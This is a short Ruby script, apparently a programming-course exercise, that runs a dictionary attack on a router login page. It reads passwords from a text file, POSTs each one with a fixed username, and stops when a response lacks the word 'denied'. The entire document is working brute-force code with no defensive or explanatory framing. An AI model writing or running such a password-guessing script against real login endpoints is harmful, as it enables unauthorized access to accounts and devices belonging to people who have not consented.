require "net/http"
require "uri"

def is_password_wrong? password
  uri = URI.parse 'http://rubyschool.us/router'
  responce = Net::HTTP.post_form(uri, :login => 'aaa', :password => password).body
  responce.include? "denied"
end

input = File.open('password.txt', 'r')

while (line = input.gets)
  line.strip!

  print "Trying password: #{line} - "

  if is_password_wrong? line
    print "Not Found\n"
  else
    print "Found\n"
    input.close
    exit
  end

end
